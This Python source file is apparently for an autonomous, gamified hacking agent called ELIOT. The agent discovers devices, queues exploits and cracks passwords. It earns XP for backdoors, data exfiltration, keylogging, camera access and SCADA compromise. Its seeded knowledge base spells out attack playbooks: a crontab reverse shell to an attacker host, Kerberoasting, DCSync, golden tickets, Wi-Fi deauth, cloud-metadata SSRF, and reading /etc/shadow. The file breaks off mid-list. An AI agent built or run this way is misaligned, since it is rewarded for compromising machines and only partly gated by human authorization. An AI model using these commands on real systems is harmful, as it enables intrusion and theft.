"""
Tamagotchi Engine — ELIOT Autonomous Agent

Mr. Robot-themed autonomous intelligence agent.
Runs in the background, discovers devices/vulns, prioritizes exploits,
manages cracking sessions (pausing Ollama for GPU), and creates
notifications requiring authorization for machine-access exploits.
"""

import asyncio
import json
import logging
import os
import signal
import subprocess
import time
import uuid
from dataclasses import dataclass, field, asdict
from enum import Enum
from pathlib import Path
from typing import Any, Dict, List, Optional

from agents.sentient import Network, Device, WiFiAP, Service, DeviceType

logger = logging.getLogger(__name__)


class TamaState(str, Enum):
    IDLE = "idle"
    SCANNING = "scanning"
    MAPPING = "mapping"
    CRACKING = "cracking"
    ANALYZING = "analyzing"
    EXPLOITING = "exploiting"
    ALERT = "alert"
    SLEEPING = "sleeping"


class NotificationType(str, Enum):
    NEW_DEVICE = "new_device"
    VULN_FOUND = "vuln_found"
    EXPLOIT_READY = "exploit_ready"
    CRACK_COMPLETE = "crack_complete"
    ACCESS_GAINED = "access_gained"
    ALERT = "alert"
    INFO = "info"


class AuthStatus(str, Enum):
    PENDING = "pending"
    APPROVED = "approved"
    DENIED = "denied"
    AUTO_APPROVED = "auto_approved"
    EXPIRED = "expired"


@dataclass
class Notification:
    id: str = field(default_factory=lambda: str(uuid.uuid4())[:8])
    type: NotificationType = NotificationType.INFO
    title: str = ""
    message: str = ""
    target: str = ""
    severity: str = "info"
    needs_auth: bool = False
    auth_status: AuthStatus = AuthStatus.AUTO_APPROVED
    created_at: float = field(default_factory=time.time)
    auth_at: Optional[float] = None
    result: Optional[str] = None
    exploit_cmd: Optional[str] = None

    def to_dict(self) -> Dict[str, Any]:
        d = asdict(self)
        d["type"] = self.type.value
        d["auth_status"] = self.auth_status.value
        return d


@dataclass
class CrackSession:
    id: str = field(default_factory=lambda: str(uuid.uuid4())[:8])
    tool: str = "john"
    target: str = ""
    hash_file: str = ""
    wordlist: str = "/usr/share/wordlists/rockyou.txt"
    status: str = "pending"
    progress: str = ""
    started_at: Optional[float] = None
    completed_at: Optional[float] = None
    result: Optional[str] = None
    pid: Optional[int] = None
    gpu_mode: bool = False

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


@dataclass
class ExploitTask:
    id: str = field(default_factory=lambda: str(uuid.uuid4())[:8])
    target: str = ""
    service: str = ""
    exploit_name: str = ""
    command: str = ""
    priority: int = 0  # Higher = more important
    cve: str = ""
    cvss: float = 0.0
    needs_auth: bool = True
    auth_status: AuthStatus = AuthStatus.PENDING
    created_at: float = field(default_factory=time.time)
    executed: bool = False
    result: Optional[str] = None

    def to_dict(self) -> Dict[str, Any]:
        d = asdict(self)
        d["auth_status"] = self.auth_status.value
        return d


class TamagotchiEngine:
    """
    Autonomous intelligence agent.
    Discovers, maps, prioritizes, and (with authorization) exploits.
    Gamified with XP, levels, weighted rewards, and learning from mistakes.
    """

    # Commands that need authorization (machine access / data extraction)
    AUTH_REQUIRED_PATTERNS = [
        "msfconsole", "msfvenom", "meterpreter",
        "hydra", "ncrack",
        "sqlmap --dump", "sqlmap --os-shell", "sqlmap --os-pwn",
        "exploit", "payload", "reverse_tcp",
        "john --show", "hashcat",
        "sshpass", "smbclient -L",
        "mount", "chroot",
        "curl -d", "wget --post",
        "airodump-ng", "aireplay-ng", "aireplay",
        "mdk4", "reaver", "bully", "pixiewps",
    ]

    # Commands that are always safe (no auth needed)
    SAFE_PATTERNS = [
        "nmap", "nikto", "whatweb", "gobuster", "dirb", "dirbuster",
        "enum4linux", "smbclient -N", "snmpwalk",
        "curl", "wget", "httpie",
        "arp", "ip ", "ifconfig", "ss", "netstat",
        "hcitool", "bluetoothctl",
        "nmcli", "iwlist", "iw ",
        "searchsploit",
        "cat ", "ls ", "grep ", "find ", "head ", "tail ",
        "airodump-ng --write", "tshark", "tcpdump",
        "macchanger",
    ]

    # ── Gamification Constants ───────────────────────────────
    XP_WEIGHTS = {
        # ── Recon & Discovery ──
        "scan_complete": 10,
        "device_discovered": 15,
        "service_detected": 20,
        "os_identified": 12,
        "vuln_found": 30,
        "vuln_validated": 45,
        "new_network_mapped": 25,
        "topology_updated": 8,
        "full_port_scan": 15,
        "service_enum_deep": 18,
        "report_generated": 20,
        "knowledge_logged": 8,
        "scan_informed": 5,
        # ── WiFi & Wireless ──
        "wifi_ap_found": 12,
        "bluetooth_found": 10,
        "wifi_traffic_captured": 15,
        "handshake_captured": 80,
        "pmkid_captured": 75,
        "wpa_cracked": 100,
        "wifi_deauth": 35,
        "evil_twin_setup": 60,
        "wps_pin_cracked": 70,
        "wifi_client_isolated": 25,
        # ── Exploitation ──
        "exploit_success": 50,
        "service_exploited": 55,
        "default_creds_found": 60,
        "reverse_shell_obtained": 120,
        "access_gained": 150,
        "auth_granted": 5,
        "ftp_anon_access": 40,
        "smb_null_session": 45,
        "redis_unauthenticated": 50,
        "tomcat_manager_bypass": 65,
        "ssh_default_creds": 55,
        "snmp_community_found": 35,
        "smb_relay_executed": 80,
        "kerberoasted": 90,
        "asrep_roasted": 85,
        "password_sprayed": 40,
        # ── Post-Exploitation ──
        "crack_complete": 40,
        "hash_cracked": 45,
        "credential_harvested": 55,
        "privilege_escalated": 130,
        "lateral_movement": 110,
        "port_forward_established": 45,
        "data_exfiltrated": 100,
        "backdoor_installed": 140,
        "persistence_established": 120,
        "pivot_established": 90,
        "screen_capture": 30,
        "keylog_captured": 50,
        "clipboard_stolen": 25,
        # ── Password Attacks ──
        "hydra_bruteforce": 50,
        "john_crack": 40,
        "hashcat_crack": 45,
        "dictionary_attack": 35,
        "rule_based_crack": 50,
        # ── MITM ──
        "mitm_established": 95,
        "arp_spoofing": 65,
        "dns_spoofing": 70,
        "ssl_stripping": 80,
        "credential_intercepted": 110,
        # ── Penalties ──
        "false_positive": -15,
        "scan_timeout": -5,
        "exploit_failed": -20,
        "wrong_classification": -10,
        "detection_escalated": -30,
        "target_lockout": -25,
        "connection_lost": -10,
        # ── Advanced Exploitation ──
        "ssrf_exploited": 75,
        "xxe_exploited": 70,
        "deserialization_rce": 85,
        "jwt_bypass": 65,
        "graphql_exploited": 70,
        "oauth_token_stolen": 80,
        "file_upload_webshell": 75,
        "command_injection": 80,
        "path_traversal": 55,
        "idor_exploited": 60,
        # ── Container & Cloud ──
        "docker_escape": 150,
        "k8s_rce": 140,
        "container_breakout": 130,
        "aws_access_key_found": 100,
        "gcp_metadata_accessed": 90,
        "cloud_role_assumed": 85,
        "s3_bucket_exposed": 70,
        # ── IoT & Embedded ──
        "iot_device_hacked": 60,
        "camera_accessed": 50,
        "scada_exploited": 120,
        "printer_compromised": 55,
        "router_backdoored": 75,
        "firmware_extracted": 40,
        # ── Network Attacks ──
        "vlan_hopped": 70,
        "vxlan_hijacked": 65,
        "ipv6_spoofed": 60,
        "llmnr_poisoned": 55,
        "rogue_dhcp": 50,
        "dns_cache_poisoned": 70,
        # ── Advanced Persistence ──
        "pam_backdoor": 100,
        "ld_preload_rootkit": 110,
        "systemd_persistence": 80,
        "cron_persistence": 60,
        "ssh_key_persistence": 70,
        "webshell_placed": 85,
        "golden_ticket": 150,
        # ── Data Operations ──
        "credential_database_dumped": 95,
        "password_hash_dumped": 80,
        "token_impersonated": 85,
        "dns_exfiltration": 90,
        "tunnel_established": 75,
    }

    LEVEL_XP = [
        0, 100, 250, 500, 800, 1200, 1800, 2500, 3500, 5000,
        7000, 10000, 14000, 19000, 25000, 32000, 40000, 50000,
        62000, 75000, 90000, 110000, 135000, 165000, 200000,
    ]

    LEVEL_NAMES = [
        "Script Kiddie", "Script Kiddie", "Script Kiddie",
        "Novice Hacker", "Novice Hacker",
        "Junior Pentester", "Junior Pentester",
        "Pentester", "Pentester", "Pentester",
        "Senior Pentester", "Senior Pentester",
        "Security Analyst", "Security Analyst",
        "Red Team Operator", "Red Team Operator",
        "Exploit Developer", "Exploit Developer",
        "Security Researcher", "Security Researcher",
        "Bug Hunter", "Bug Hunter",
        "Elite Hacker", "Elite Hacker", "Elite Hacker",
    ]

    ACHIEVEMENTS = {
        # ── Discovery Milestones ──
        "first_scan": {"name": "First Steps", "desc": "Complete your first scan", "xp": 50, "icon": "🔍"},
        "first_device": {"name": "Network Explorer", "desc": "Discover your first device", "xp": 75, "icon": "📡"},
        "first_vuln": {"name": "Bug Finder", "desc": "Find your first vulnerability", "xp": 100, "icon": "🐛"},
        "ten_devices": {"name": "Network Mapper", "desc": "Discover 10 devices", "xp": 300, "icon": "🗺️"},
        "fifty_devices": {"name": "Network Conqueror", "desc": "Discover 50 devices", "xp": 800, "icon": "🏔️"},
        "ten_vulns": {"name": "Vuln Collector", "desc": "Find 10 vulnerabilities", "xp": 400, "icon": "📋"},
        "fifty_services": {"name": "Service Inspector", "desc": "Identify 50 unique services", "xp": 350, "icon": "🔎"},
        "full_network": {"name": "Network Dominator", "desc": "Map an entire /24 subnet", "xp": 600, "icon": "🌐"},
        "full_port_sweep": {"name": "Port Sweeper", "desc": "Complete a full 65535 port scan", "xp": 250, "icon": "🔌"},
        # ── Exploitation Milestones ──
        "first_exploit": {"name": "Exploit Artist", "desc": "Execute your first exploit", "xp": 200, "icon": "💥"},
        "first_access": {"name": "Break In", "desc": "Gain shell access to a machine", "xp": 300, "icon": "🔓"},
        "five_access": {"name": "Access Collector", "desc": "Gain access to 5 machines", "xp": 800, "icon": "🦾"},
        "ten_access": {"name": "Systemic Breach", "desc": "Gain access to 10 machines", "xp": 1500, "icon": "👑"},
        "default_creds_hunter": {"name": "Cred Sweeper", "desc": "Find default credentials on 3 services", "xp": 250, "icon": "🔑"},
        "first_backdoor": {"name": "Shadow Operator", "desc": "Install your first backdoor", "xp": 350, "icon": "🚪"},
        "five_backdoors": {"name": "Backdoor Architect", "desc": "Install backdoors on 5 machines", "xp": 1000, "icon": "🏗️"},
        "first_mitm": {"name": "Man in the Middle", "desc": "Execute your first MITM attack", "xp": 300, "icon": "🕵️"},
        "first_priv_esc": {"name": "Root Seeker", "desc": "Escalate privileges for the first time", "xp": 400, "icon": "⬆️"},
        "five_priv_esc": {"name": "Privilege Lord", "desc": "Escalate privileges 5 times", "xp": 1200, "icon": "🔱"},
        "first_lateral": {"name": "Pivot King", "desc": "Move laterally between machines", "xp": 350, "icon": "🔄"},
        "first_exfil": {"name": "Data Thief", "desc": "Exfiltrate data from a target", "xp": 400, "icon": "📦"},
        "first_reverse_shell": {"name": "Shell Gained", "desc": "Obtain a reverse shell", "xp": 350, "icon": "🐚"},
        # ── WiFi Milestones ──
        "first_crack": {"name": "Password Hunter", "desc": "Crack your first password/hash", "xp": 150, "icon": "🔐"},
        "first_handshake": {"name": "Handshake Captured", "desc": "Capture your first WPA2 handshake", "xp": 250, "icon": "🤝"},
        "ten_handshakes": {"name": "WiFi Warrior", "desc": "Capture 10 WPA2 handshakes", "xp": 800, "icon": "⚔️"},
        "first_wpa_crack": {"name": "Key Cracker", "desc": "Crack a WPA2 password", "xp": 350, "icon": "🗝️"},
        "first_evil_twin": {"name": "Impersonator", "desc": "Set up your first evil twin", "xp": 300, "icon": "👯"},
        "first_deauth": {"name": "Air Jammer", "desc": "Execute a deauth attack", "xp": 200, "icon": "📡"},
        # ── Credential Attacks ──
        "first_hash_crack": {"name": "Hash Breaker", "desc": "Crack your first hash", "xp": 200, "icon": "#️⃣"},
        "ten_hashes": {"name": "Hash Collector", "desc": "Crack 10 hashes", "xp": 500, "icon": "🧮"},
        "first_kerberoast": {"name": "AD Exploiter", "desc": "Kerberoast an AD account", "xp": 350, "icon": "🎯"},
        "first_hydra": {"name": "Brute Force Pro", "desc": "Crack a password with Hydra", "xp": 200, "icon": "🔨"},
        # ── Persistence & Stealth ──
        "first_persistence": {"name": "Permanent Access", "desc": "Establish persistence on a target", "xp": 300, "icon": "📌"},
        "three_persistence": {"name": "Persistent Hacker", "desc": "Establish persistence on 3 machines", "xp": 800, "icon": "🏛️"},
        "stealth_master": {"name": "Ghost", "desc": "Complete 10 operations undetected", "xp": 300, "icon": "👻"},
        "first_pivot": {"name": "Pivot Master", "desc": "Set up port forwarding/pivoting", "xp": 250, "icon": "🌉"},
        # ── MITM & Intercept ──
        "first_arp_spoof": {"name": "ARP Master", "desc": "Execute ARP spoofing", "xp": 200, "icon": "🃏"},
        "first_ssl_strip": {"name": "HTTPS Downgrader", "desc": "Perform SSL stripping", "xp": 300, "icon": "📉"},
        "first_credential_intercept": {"name": "Credential Sniffer", "desc": "Intercept credentials via MITM", "xp": 400, "icon": "🦯"},
        # ── XP Milestones ──
        "hundred_xp": {"name": "Rising Star", "desc": "Earn 100 XP total", "xp": 50, "icon": "⭐"},
        "thousand_xp": {"name": "Dedicated Hacker", "desc": "Earn 1000 XP total", "xp": 100, "icon": "🌟"},
        "five_thousand_xp": {"name": "XP Grinder", "desc": "Earn 5000 XP total", "xp": 200, "icon": "💫"},
        "ten_thousand_xp": {"name": "Veteran", "desc": "Earn 10000 XP total", "xp": 400, "icon": "🏅"},
        # ── Level Milestones ──
        "level_5": {"name": "Getting Serious", "desc": "Reach level 5", "xp": 200, "icon": "📈"},
        "level_10": {"name": "Pro Pentester", "desc": "Reach level 10", "xp": 500, "icon": "🏆"},
        "level_15": {"name": "Red Teamer", "desc": "Reach level 15", "xp": 750, "icon": "🎖️"},
        "level_20": {"name": "Elite Operator", "desc": "Reach level 20", "xp": 1000, "icon": "🥇"},
        # ── Special ──
        "night_owl": {"name": "Night Owl", "desc": "Run operations between 2-5 AM", "xp": 75, "icon": "🦉"},
        "night_stalker": {"name": "Night Stalker", "desc": "Complete 5 operations between 2-5 AM", "xp": 300, "icon": "🦇"},
        "speed_demon": {"name": "Speed Demon", "desc": "Complete a full cycle in under 60s", "xp": 200, "icon": "⚡"},
        "chain_master": {"name": "Kill Chain", "desc": "Chain recon, exploit, pivot, and escalate", "xp": 1000, "icon": "⛓️"},
        "vuln_chain": {"name": "Vuln Chainer", "desc": "Chain 3+ vulnerabilities together", "xp": 500, "icon": "🔗"},
        "zero_day_hunter": {"name": "Zero Day Hunter", "desc": "Find 10 unique CVEs", "xp": 600, "icon": "🕵️‍♂️"},
        "full_spectrum": {"name": "Full Spectrum", "desc": "Perform recon, exploit, and post-exploit in one cycle", "xp": 500, "icon": "🌈"},
        "machine_whisperer": {"name": "Machine Whisperer", "desc": "Access 3 different OS types", "xp": 450, "icon": "🤖"},
        # ── Advanced Exploitation ──
        "first_ssrf": {"name": "Server Whisperer", "desc": "Exploit SSRF to access internal services", "xp": 350, "icon": "🔬"},
        "first_xxe": {"name": "XML Blaster", "desc": "Exploit XXE for file read", "xp": 300, "icon": "📄"},
        "first_deserialization": {"name": "Deserialization Master", "desc": "Achieve RCE via deserialization", "xp": 400, "icon": "🧬"},
        "first_jwt_bypass": {"name": "Token Forger", "desc": "Bypass JWT authentication", "xp": 300, "icon": "🎫"},
        "first_graphql": {"name": "Schema Leaker", "desc": "Exploit GraphQL introspection", "xp": 250, "icon": "🔮"},
        "first_sqli": {"name": "Database Raider", "desc": "Achieve SQL injection", "xp": 350, "icon": "💉"},
        "first_command_injection": {"name": "Command Master", "desc": "Achieve OS command injection", "xp": 350, "icon": "💻"},
        "first_rce_chain": {"name": "Chain Reaction", "desc": "Chain two vulns for RCE", "xp": 500, "icon": "⚡"},
        # ── Container & Cloud ──
        "first_docker_escape": {"name": "Container Breaker", "desc": "Escape a Docker container", "xp": 600, "icon": "🐳"},
        "first_k8s_rce": {"name": "Kubernetes Dominator", "desc": "Achieve RCE in Kubernetes", "xp": 550, "icon": "☸️"},
        "first_cloud_access": {"name": "Cloud Raider", "desc": "Gain cloud console/API access", "xp": 450, "icon": "☁️"},
        "aws_keys_harvested": {"name": "AWS Key Hunter", "desc": "Harvest AWS access keys", "xp": 400, "icon": "🔑"},
        # ── IoT & Embedded ──
        "first_iot_hack": {"name": "IoT Infiltrator", "desc": "Compromise an IoT device", "xp": 300, "icon": "📡"},
        "first_camera_access": {"name": "Peeping Tom", "desc": "Access an IP camera feed", "xp": 250, "icon": "📷"},
        "first_scada_exploit": {"name": "ICS Pioneer", "desc": "Exploit a SCADA/ICS system", "xp": 500, "icon": "🏭"},
        "first_router_backdoor": {"name": "Router Jockey", "desc": "Backdoor a network router", "xp": 350, "icon": "🌐"},
        "firmware_extracted": {"name": "Firmware Analyst", "desc": "Extract and analyze device firmware", "xp": 250, "icon": "💾"},
        # ── Network Attacks ──
        "first_vlan_hop": {"name": "VLAN Escaper", "desc": "Perform VLAN hopping attack", "xp": 300, "icon": "🔀"},
        "first_arp_mitm": {"name": "ARP Poisoner", "desc": "Execute ARP MITM attack", "xp": 350, "icon": "🃏"},
        "first_dns_poison": {"name": "DNS Manipulator", "desc": "Poison DNS cache", "xp": 300, "icon": "🌐"},
        "first_rogue_dhcp": {"name": "DHCP Impersonator", "desc": "Deploy rogue DHCP server", "xp": 250, "icon": "📡"},
        # ── Advanced Persistence ──
        "pam_backdoor_installed": {"name": "Skeleton Key", "desc": "Install PAM backdoor", "xp": 500, "icon": "🦴"},
        "rootkit_installed": {"name": "Rootkit Master", "desc": "Install LD_PRELOAD rootkit", "xp": 550, "icon": "🏴"},
        "golden_ticket_created": {"name": "Golden Ticket", "desc": "Create Kerberos Golden Ticket", "xp": 700, "icon": "🎟️"},
        "webshell_deployed": {"name": "Webshell Artist", "desc": "Deploy webshell on target", "xp": 350, "icon": "🕸️"},
        # ── Data Operations ──
        "first_token_impersonation": {"name": "Token Thief", "desc": "Impersonate a Windows token", "xp": 400, "icon": "🎭"},
        "first_credential_dump": {"name": "Dump Master", "desc": "Dump credential database", "xp": 450, "icon": "🗄️"},
        "first_dns_exfil": {"name": "Data Smuggler", "desc": "Exfiltrate data via DNS", "xp": 400, "icon": "📦"},
        "first_tunnel": {"name": "Tunnel Rat", "desc": "Establish covert tunnel", "xp": 350, "icon": "🐀"},
        # ── Combo Achievements ──
        "recon_to_root": {"name": "Zero to Root", "desc": "Full recon to root shell in one session", "xp": 800, "icon": "👑"},
        "five_os_types": {"name": "Platform Agnostic", "desc": "Compromise 5 different OS types", "xp": 700, "icon": "🌍"},
        "hundred_scans": {"name": "Scan Machine", "desc": "Complete 100 scans", "xp": 500, "icon": "📊"},
        "twenty_vulns": {"name": "Vuln Hoarder", "desc": "Discover 20 vulnerabilities", "xp": 600, "icon": "🏆"},
        "week_streak": {"name": "Dedicated", "desc": "Maintain 7-day activity streak", "xp": 400, "icon": "📅"},
    }

    def __init__(self):
        self._state = TamaState.IDLE
        self._notifications: List[Notification] = []
        self._exploit_queue: List[ExploitTask] = []
        self._crack_sessions: List[CrackSession] = []
        self._knowledge_log: List[Dict[str, Any]] = []
        self._running = False
        self._paused = False
        self._loop_task: Optional[asyncio.Task] = None
        self._scan_task: Optional[asyncio.Task] = None
        self._ollama_pid: Optional[int] = None
        self._ollama_was_running = False
        self._stats = {
            "scans_run": 0,
            "devices_found": 0,
            "vulns_found": 0,
            "vulns_validated": 0,
            "exploits_executed": 0,
            "cracks_run": 0,
            "hashes_cracked": 0,
            "notifications_created": 0,
            "authorizations_granted": 0,
            "handshakes_captured": 0,
            "networks_analyzed": 0,
            "open_networks_found": 0,
            "access_gained": 0,
            "backdoors_installed": 0,
            "credentials_harvested": 0,
            "privilege_escalations": 0,
            "lateral_movements": 0,
            "mitm_attacks": 0,
            "data_exfiltrations": 0,
            "persistence_established": 0,
            "wifi_cracks": 0,
            "wifi_deauths": 0,
            "evil_twins": 0,
            "reverse_shells": 0,
            "kerberoasts": 0,
            "pivot_count": 0,
            "reports_generated": 0,
            "cycle_count": 0,
        }
        # ── Network State (tamagotchi IS the sole engine) ──
        self._devices: Dict[str, Any] = {}
        self._networks: Dict[str, Any] = {}
        self._wifi_aps: Dict[str, Any] = {}
        self._topology: Dict[str, Any] = {"nodes": [], "edges": []}
        self._our_ip: str = ""
        self._our_mac: str = ""
        self._my_interfaces: Dict[str, str] = {}
        self._wifi_interface: str = "wlxc4e984dfb30f"
        self._PRIMARY_WIFI: str = "wlxc4e984dfb30f"
        self._live_events: List[Dict[str, Any]] = []
        self._max_live_events: int = 500
        self._ws_clients: set = set()
        self._scan_history: List[Dict[str, Any]] = []
        self._last_full_scan: float = 0
        # ── Gamification State ──
        self._xp: int = 0
        self._level: int = 1
        self._total_xp: int = 0
        self._achievements: List[str] = []
        self._event_log: List[Dict[str, Any]] = []
        self._streaks: Dict[str, int] = {
            "scans": 0, "devices": 0, "vulns": 0, "exploits": 0,
            "creds": 0, "wifi": 0, "access": 0, "persistence": 0,
            "mitm": 0, "lateral": 0,
        }
        self._mistakes: List[Dict[str, Any]] = []
        self._current_thought: str = "Initializing..."
        self._thinking_log: List[Dict[str, Any]] = []
        # ── Phase tracking for user's route ──
        self._current_phase: str = "init"
        self._phase_progress: Dict[str, Any] = {}
        self._network_queue: List[Dict[str, Any]] = []
        self._target_queue: List[Dict[str, Any]] = []
        self._reports: List[Dict[str, Any]] = []
        # Persistence
        self._data_dir = Path(os.environ.get("ELIOT_DATA_DIR", "/app/data")) / "tamagotchi"
        self._data_dir.mkdir(parents=True, exist_ok=True)
        self._load_state()
        self._seed_knowledge()

    def _load_state(self):
        """Load persisted state from disk."""
        state_file = self._data_dir / "state.json"
        if not state_file.exists():
            return
        try:
            with open(state_file, 'r') as f:
                data = json.load(f)
            self._xp = data.get("xp", 0)
            self._level = data.get("level", 1)
            self._total_xp = data.get("total_xp", 0)
            self._achievements = data.get("achievements", [])
            self._streaks = data.get("streaks", {"scans": 0, "devices": 0, "vulns": 0, "exploits": 0})
            # Merge new stat keys with defaults (backwards compatible with old saves)
            saved_stats = data.get("stats", {})
            for k, v in self._stats.items():
                if k not in saved_stats:
                    saved_stats[k] = v
            self._stats = saved_stats
            # Merge new streak keys with defaults
            default_streaks = {"scans": 0, "devices": 0, "vulns": 0, "exploits": 0,
                               "creds": 0, "wifi": 0, "access": 0, "persistence": 0,
                               "mitm": 0, "lateral": 0}
            for k, v in default_streaks.items():
                if k not in self._streaks:
                    self._streaks[k] = 0
            logger.info(f"Loaded state: level={self._level}, xp={self._total_xp}, achievements={len(self._achievements)}")
        except Exception as e:
            logger.error(f"Failed to load state: {e}")

        # Load knowledge
        knowledge_file = self._data_dir / "knowledge.json"
        if knowledge_file.exists():
            try:
                with open(knowledge_file, 'r') as f:
                    raw = json.load(f)
                # Deduplicate: keep last entry per category+key
                seen = {}
                for entry in raw:
                    ck = (entry.get("category"), entry.get("key"))
                    seen[ck] = entry
                self._knowledge_log = list(seen.values())
                logger.info(f"Loaded {len(self._knowledge_log)} knowledge entries (deduped from {len(raw)})")
            except Exception as e:
                logger.error(f"Failed to load knowledge: {e}")

        # Load persisted devices
        devices_file = self._data_dir / "devices.json"
        if devices_file.exists():
            try:
                from agents.sentient import Device, Service, DeviceType
                with open(devices_file, 'r') as f:
                    devs = json.load(f)
                for ip, d in devs.items():
                    dev = Device(ip=ip, hostname=d.get("hostname", ""))
                    if "services" in d:
                        for s in d["services"]:
                            if isinstance(s, dict):
                                svc = Service(
                                    name=s.get("name", "unknown"),
                                    port=s.get("port", 0),
                                    version=s.get("version", ""),
                                    product=s.get("product", ""),
                                )
                                dev.services.append(svc)
                    if "os_guess" in d:
                        dev.os_guess = d["os_guess"]
                    if "device_type" in d:
                        try:
                            dev.device_type = DeviceType(d.get("device_type", "unknown"))
                        except ValueError:
                            pass
                    self._devices[ip] = dev
                logger.info(f"Loaded {len(self._devices)} persisted devices")
            except Exception as e:
                logger.error(f"Failed to load devices: {e}")

        # Load event log
        events_file = self._data_dir / "events.json"
        if events_file.exists():
            try:
                with open(events_file, 'r') as f:
                    self._event_log = json.load(f)
                logger.info(f"Loaded {len(self._event_log)} events")
            except Exception as e:
                logger.error(f"Failed to load events: {e}")

        # Load mistakes
        mistakes_file = self._data_dir / "mistakes.json"
        if mistakes_file.exists():
            try:
                with open(mistakes_file, 'r') as f:
                    self._mistakes = json.load(f)
                logger.info(f"Loaded {len(self._mistakes)} mistakes")
            except Exception as e:
                logger.error(f"Failed to load mistakes: {e}")

    def _seed_knowledge(self):
        """Seed knowledge base with attack patterns, workflows, CVEs, and techniques. Deduplicates via log_knowledge."""
        seed = []

        # ══════════════════════════════════════════════════════
        # END-TO-END PENTEST WORKFLOWS (15)
        # ══════════════════════════════════════════════════════
        seed.append(("workflow", "full_pentest_e2e", {
            "name": "Full Penetration Test Workflow",
            "phases": [
                "1. Recon: nmap -sV -sC -O -T4 target/24",
                "2. Enum: gobuster dir -u http://target -w wordlist.txt",
                "3. Vuln Scan: nmap --script vuln -T4 target",
                "4. Exploit: msfconsole 'use exploit; set RHOSTS target; exploit'",
                "5. Post-Exploit: meterpreter > hashdump; meterpreter > shell",
                "6. PrivEsc: sudo -l; find / -perm -4000 2>/dev/null",
                "7. Persistence: echo 'bash -i >& /dev/tcp/attacker/4444 0>&1' | crontab -",
                "8. Report: document all findings, CVEs, evidence",
            ],
            "tools": ["nmap", "gobuster", "nikto", "msfconsole", "meterpreter", "john"],
            "estimated_time": "4-8 hours",
            "skill_level": "intermediate",
        }, "mitre"))

        seed.append(("workflow", "wifi_pentest_e2e", {
            "name": "WiFi Penetration Test",
            "phases": [
                "1. Monitor mode: airmon-ng start wlxc4e984dfb30f",
                "2. Discover: airodump-ng wlan0mon",
                "3. Target: airodump-ng --bssid TARGET --channel CH --write cap wlan0mon",
                "4. Deauth: aireplay-ng -0 5 -a TARGET -c CLIENT wlan0mon",
                "5. Capture 4-way handshake",
                "6. Crack: aircrack-ng -w rockyou.txt cap-01.cap",
                "7. If WPA2-Enterprise: hostapd-wpe for credential harvesting",
            ],
            "tools": ["airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng"],
            "requires_auth": True,
            "estimated_time": "1-4 hours",
        }, "mitre"))

        seed.append(("workflow", "web_app_pentest_e2e", {
            "name": "Web Application Penetration Test",
            "phases": [
                "1. Recon: whatweb target; nikto -h target; dirb target wordlist.txt",
                "2. Spider: gobuster dir -u target -x php,html,txt -w wordlist",
                "3. Enum: wfuzz -c wordlist -z file,users.txt target/FUZZ",
                "4. SQLi: sqlmap -u 'target/?id=1' --dbs --batch",
                "5. XSS: <script>alert(1)</script> in all input fields",
                "6. SSRF: http://target/internal; http://169.254.169.254/latest/meta-data/",
                "7. File Upload: bypass extension filter, upload webshell",
                "8. RCE: command injection via ping, eval, exec functions",
            ],
            "tools": ["nikto", "gobuster", "sqlmap", "wfuzz", "whatweb", "dirb"],
            "estimated_time": "2-6 hours",
        }, "owasp"))

        seed.append(("workflow", "active_directory_attack", {
            "name": "Active Directory Attack Chain",
            "phases": [
                "1. Enum: enum4linux -a domain_controller",
                "2. User Enum: rpcclient -U '' -N domain_controller 'enumdomusers'",
                "3. Kerberoast: GetUserSPNs.py domain/user:pass -request",
                "4. AS-REP Roast: GetNPUsers.py domain/ -usersfile users.txt -format hashcat",
                "5. Pass-the-Hash: psexec.py -hashes aad3b... domain/admin@target",
                "6. DCSync: secretsdump.py domain/admin:pass@dc_ip",
                "7. Golden Ticket: ticketer.py -nthash krbtgt_hash -domain-sid SID domain",
            ],
            "tools": ["enum4linux", "impacket", "bloodhound", "rubeus"],
            "requires_auth": True,
            "estimated_time": "4-12 hours",
        }, "mitre"))

        seed.append(("workflow", "privilege_escalation_linux", {
            "name": "Linux Privilege Escalation",
            "phases": [
                "1. System Info: uname -a; cat /etc/os-release; id; whoami",
                "2. Sudo: sudo -l",
                "3. SUID: find / -perm -4000 2>/dev/null",
                "4. Capabilities: getcap -r / 2>/dev/null",
                "5. Writable Paths: find / -writable -type f 2>/dev/null",
                "6. Cron Jobs: cat /etc/crontab; ls -la /etc/cron*",
                "7. Kernel Exploit: searchsploit linux kernel 4.x",
                "8. Docker Escape: ls -la /var/run/docker.sock",
                "9. Exploit: use matching exploit from searchsploit",
            ],
            "tools": ["linpeas", "linux-exploit-suggester", "searchsploit"],
            "estimated_time": "1-2 hours",
        }, "mitre"))

        seed.append(("workflow", "privilege_escalation_windows", {
            "name": "Windows Privilege Escalation",
            "phases": [
                "1. System Info: systeminfo; hostname; whoami /priv",
                "2. Patch Level: systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\"",
                "3. Services: sc query; wmic service list brief",
                "4. AlwaysInstallElevated: reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer",
                "5. Unquoted Service: wmic service get name,displayname,pathname",
                "6. Autorun: reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                "7. Token Impersonation: Incognito via Metasploit",
                "8. Exploit: Use matching exploit from searchsploit",
            ],
            "tools": ["winpeas", "seatbelt", "metasploit"],
            "requires_auth": True,
            "estimated_time": "1-3 hours",
        }, "mitre"))

        seed.append(("workflow", "lateral_movement", {
            "name": "Lateral Movement Techniques",
            "phases": [
                "1. Pass-the-Hash: psexec.py -hashes :NTLM admin@target",
                "2. Pass-the-Ticket: export KRB5CCNAME=/tmp/ticket.ccache",
                "3. Overpass-the-Hash: psexec.py domain/user:pass@target",
                "4. WMI Execution: wmiexec.py domain/user:pass@target 'cmd /c whoami'",
                "5. WinRM: evil-winrm -i target -u user -p pass",
                "6. SSH Tunneling: ssh -L 8080:internal:80 user@jump_host",
                "7. RDP: xfreerdp /v:target /u:user /p:pass /dynamic-resolution",
            ],
            "tools": ["impacket", "evil-winrm", "xfreerdp", "ssh"],
            "requires_auth": True,
        }, "mitre"))

        seed.append(("workflow", "data_exfiltration", {
            "name": "Data Exfiltration Techniques",
            "phases": [
                "1. File Discovery: find / -name '*.conf' -o -name '*.key' -o -name '*.pem' 2>/dev/null",
                "2. Credentials: cat /etc/shadow; cat /etc/passwd",
                "3. Database Dump: mysqldump -u root -p --all-databases",
                "4. Archive: tar czf /tmp/data.tar.gz /target/dir",
